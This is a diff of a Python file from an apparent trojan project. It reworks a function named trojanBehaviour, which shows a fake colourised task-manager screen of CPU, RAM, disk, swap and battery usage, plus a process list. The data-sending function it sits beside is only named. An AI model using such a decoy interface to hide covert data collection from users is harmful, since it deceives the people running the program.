@@ -8,7 +8,7 @@ import pyautogui
 import traceback
 import subprocess
 from threading import Timer
-
+from colorama import Fore
 
 # OK mando informazioni so
 def sendInfo(client):
@@ -28,21 +28,42 @@ def sendInfo(client):
 def trojanBehaviour():
     while True:
         try:
-            cpu = psutil.cpu_percent()
-            ram = psutil.virtual_memory().percent
+            cpu =  psutil.cpu_percent()
+            ram =  psutil.virtual_memory().percent
             disk = psutil.disk_usage("/").percent
+            mem= psutil.swap_memory().percent
+            battery= psutil.sensors_battery().percent
             processes_count = 0
-            print("\n                         RESOURCE MANAGEMENT SYSTEM                   \n")
-            print("              --     Task manager: Current state of usage      --\n\n")
+
+
+
+            print(Fore.RED + "\n                               RESOURCE MANAGEMENT SYSTEM                   \n")
+            print(Fore.RESET + "                   --     Task manager: Current state of usage      --\n")
             # facciamo un display a video dell'utilizzo
-            print("              --------------------------------------------------------- ")
-            print("             | CPU USAGE | RAM USAGE | DISK USAGE | RUNNING PROCESSES |")
-            print("             | {:02}%       | {:02}%       | {:02}%        | {:03}               |".format(int(cpu),
+            print("              ------------------------------------------------------------- ")
+            print(Fore.RESET + "             |"+Fore.GREEN + " CPU USAGE"+Fore.RESET+" |"+Fore.GREEN + " RAM USAGE"+Fore.RESET+" |"+Fore.GREEN + " DISK USAGE"+Fore.RESET+" |"+Fore.GREEN + " MEMORY USAGE"+Fore.RESET+" |"+Fore.GREEN + " BATTERY"+Fore.RESET+" |")
+            print(Fore.RESET + "             | {:02}%       | {:02}%       | {:02}%        | {:02}%          | {:02}%     |".format(int(cpu),
                                                                                                               int(ram),
                                                                                                               int(disk),
-                                                                                                              processes_count))
-            print("              --------------------------------------------------------- ")
-            time.sleep(5)
+                                                                                                              int(mem),
+                                                                                                              int(battery)))
+            print("              ------------------------------------------------------------- ")
+            process = subprocess.Popen('tasklist /fi "MEMUSAGE gt 100000"', stdout=subprocess.PIPE,
+                                       stderr=subprocess.PIPE, stdin=subprocess.PIPE,
+                                       shell=True)
+            timer = Timer(3, process.terminate)
+            try:
+                timer.start()
+                stdout, stderr = process.communicate()
+                output = stdout or stderr
+            finally:
+                timer.cancel()
+
+            final_output = output.replace(b"\r\n", b"\n").decode(encoding="windows-1252").encode()
+            time.sleep(1.5)
+            print(final_output.decode('utf-8'))
+
+            time.sleep(7)
             clearScreen()
         except:
             print("              --------------------------------------------------------- ")
